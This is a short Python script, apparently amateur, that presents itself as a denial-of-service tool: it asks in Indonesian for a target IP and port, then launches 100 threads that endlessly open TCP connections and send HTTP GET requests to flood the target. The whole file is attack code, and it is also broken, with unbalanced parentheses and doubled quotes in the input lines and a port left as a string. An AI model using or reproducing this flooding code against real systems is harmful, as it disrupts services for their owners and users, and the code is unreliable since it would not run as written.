import socket
import threading

# Target IP and port
target_ip = input(str("masukan ip:")
target_port = input(str(""masukan port:"))

# Function to perform the attack
def dos_attack():
    while True:
        # Create a socket object
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Connect to the target
            s.connect((target_ip, target_port))
            # Send a large amount of data
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
        except socket.error:
            pass
        finally:
            s.close()

# Create multiple threads to perform the attack
for i in range(100):
    thread = threading.Thread(target=dos_attack)
    thread.start()
